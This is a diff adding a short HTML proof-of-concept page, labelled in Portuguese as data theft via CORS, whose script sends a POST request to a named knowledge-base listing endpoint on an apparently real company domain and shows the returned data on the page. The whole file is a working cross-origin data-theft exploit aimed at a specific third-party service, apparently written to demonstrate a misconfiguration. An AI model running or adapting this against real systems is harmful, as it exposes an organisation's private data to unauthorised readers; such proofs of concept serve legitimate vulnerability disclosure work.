@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC CORS Sinq.IA</title>
+</head>
+<body>
+  <h1>PoC: Roubo de dados via CORS</h1>
+  <button onclick="stealData()">Testar API da vítima</button>
+  <pre id="output">Clique no botão</pre>
+
+  <script>
+    function stealData() {
+      fetch("https://llm.sinqia.com.br/api/v3/knowledge-bases/list", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({})
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").textContent = data;
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = 'Erro: ' + err.message;
+      });
+    }
+  </script>
+</body>
+</html>
